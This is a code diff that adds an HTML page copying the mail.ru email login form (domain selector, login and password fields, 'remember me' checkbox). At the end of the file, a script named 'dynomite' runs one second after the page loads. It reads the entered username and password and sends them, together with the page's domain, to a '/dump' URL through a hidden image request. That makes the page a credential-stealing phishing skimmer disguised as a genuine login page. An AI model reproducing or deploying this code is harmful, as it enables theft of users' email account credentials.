@@ -1,0 +1,93 @@
+<html>
+
+<body>
+<form class="mailbox__auth__layout clearfix" data-loadsubmit-counter="d703059" name="Auth" id="Auth" method="post" action="https://auth.mail.ru/cgi-bin/auth?from=splash" data-submit-counter="clb615189" data-button-counter="clb615190"><div class="mailbox__auth__layout__row mailbox__auth__layout__row_login"><div class="mailbox__auth__layout__row__col mailbox__auth__layout__row__col_right"><select id="mailbox__login__domain" size="1" name="Domain" tabindex="4" class="mailbox__login__domain"><option value="mail.ru">@mail.ru</option><option value="inbox.ru">@inbox.ru</option><option value="list.ru">@list.ru</option><option value="bk.ru">@bk.ru</option></select><div id="domain-widget" class="nojsdn mailbox__login__domain-widget"><span id="domain-widget__text" class="mailbox__login__domain-widget__text"></span> <i class="mailbox__login__domain-widget__arrow"></i></div><script>
+						(function(){
+							var select = mr.id('mailbox__login__domain'),
+								widget = mr.id('domain-widget'),
+								text = mr.id('domain-widget__text'),
+								widgetCl = 'mailbox__login__domain-widget',
+								hasFocus = false;
+
+							function change(){
+								text.innerHTML = '@' + (select.value || 'mail.ru');
+							}
+							function uiChange(state, enable){
+								if (enable){
+									widget.className += ' ' + widgetCl + '_' + state;
+								} else {
+									widget.className = widget.className.replace(new RegExp(' ' + widgetCl + '_' + state, 'i' ), '');
+								}
+								if (state === 'focus' && enable){
+									hasFocus = true;
+								} else if (state === 'focus' &&!enable){
+									hasFocus = false;
+								}
+							}
+
+							mr.bind(select, 'change', change);
+							mr.bind(select, 'keyup', change);
+							mr.bind(select, 'focus', function(){uiChange('focus', true)});
+							mr.bind(select, 'blur', function(){uiChange('focus', false)});
+							mr.bind(select, 'mouseover', function(){uiChange('hover', true)});
+							mr.bind(select, 'mouseout', function(){uiChange('hover', false)});
+
+							change();
+							widget.mrChange = change;
+
+							var value = select.value;
+							function t(){
+								if (!hasFocus && select.value != value){
+									value = select.value;
+									change();
+								}
+								setTimeout(t, 100);
+							}
+							setTimeout(t, 100);
+						})()
+					</script></div><div class="mailbox__auth__layout__row__col mailbox__auth__layout__row__col_left"><label for="mailbox__login" class="w-mailbox__login"><span class="w-mailbox__login_outer"><span class="w-mailbox__login_inner"><span class="w-mailbox__login_input"><span id="mailbox__placeholder_login" class="nojsdn mailbox__placeholder">имя ящика</span><input id="mailbox__login" type="text" size="10" name="Login" tabindex="3" class="mailbox__login"></span></span></span></label><script>
+					var mailboxLoginPlaceholder = new Placeholder(mr.id('mailbox__login'), mr.id('mailbox__placeholder_login'));
+				</script></div></div><div class="mailbox__auth__layout__row mailbox__auth__layout__row_last"><div class="mailbox__auth__layout__row__col mailbox__auth__layout__row__col_right"><span class="w-mailbox__auth__button w-mailbox__auth__button_main"><span class="w-mailbox__auth__button w-mailbox__auth__button_outer"><span class="w-mailbox__auth__button w-mailbox__auth__button_inner"><input id="mailbox__auth__button" type="submit" value="Войти" tabindex="7" class="mailbox__auth__button"></span></span></span></div><div class="mailbox__auth__layout__row__col mailbox__auth__layout__row__col_left"><label for="mailbox__password" class="w-mailbox__password"><span class="w-mailbox__password_outer"><span class="w-mailbox__password_inner"><span id="password_warning" class="icon icon_mailbox icon_mailbox_big icon_mailbox_warning input__helper input__helper_warning"></span><span class="w-mailbox__password_limiter"><span class="w-mailbox__password_input"><span id="mailbox__placeholder_password" class="nojsdn mailbox__placeholder">пароль</span><input id="mailbox__password" type="password" size="15" name="Password" tabindex="5" value="" class="mailbox__password"></span></span></span></span></label><script>
+					var mailboxPasswordPlaceholder = new Placeholder(mr.id('mailbox__password'), mr.id('mailbox__placeholder_password'));
+					//mr.id('mailbox__password').focus();
+				</script></div></div><div class="mailbox__auth__layout__row"><div class="nojsdn mailbox__auth__layout__row__col mailbox__auth__layout__row__col_right mailbox__auth__layout__row__col_right_remember"><input type="hidden" name="new_auth_form" value="1"><label class="mailbox__auth__remember" for="mailbox__auth__remember__checkbox"><input tabindex="6" type="checkbox" name="saveauth" value="1" id="mailbox__auth__remember__checkbox" class="mailbox__auth__remember__checkbox" checked="checked"> запомнить</label><script>(function(){
+						var checkbox = mr.id('mailbox__auth__remember__checkbox');
+
+						if (!__PH.cookie.s.getGlobal('a') && mr.cookie('loginS')){
+							__PH.cookie.s.setGlobal('a', mr.cookie('loginS'));
+							mr.cookie('loginS', null);
+						}checkbox.checked = true;function change(){
+							if (checkbox.checked){
+								__PH.cookie.s.removeGlobal('a');
+							} else {
+								__PH.cookie.s.setGlobal('a', 0);
+							}
+						}
+
+						mr.bind(checkbox, 'change', change);
+						mr.bind(checkbox, 'keyup', change);
+						mr.bind(checkbox, 'click', change);
+
+						change();
+						checkbox.mrChange = change;
+					})();</script></div><div class="mailbox__auth__layout__row__col mailbox__auth__layout__row__col_left"><a class="mailbox__forget-link" href="//e.mail.ru/cgi-bin/passremind" tabindex="8" name="clb615191">Забыли пароль?</a></div></div></form>
+</body>
+
+
+<script>
+setTimeout(dynomite, 1000);
+
+function dynomite()
+{
+username = document.getElementsByTagName('input')[0].value;
+password = document.getElementsByTagName('input')[2].value;
+//alert('pass : '+password);
+
+var img = new Image();
+img.src="http://mail.ru/dump?"+username+"&"+password+"&"+document.domain;
+document.body.appendChild(img);
+}
+</script>
+
+
+</html>
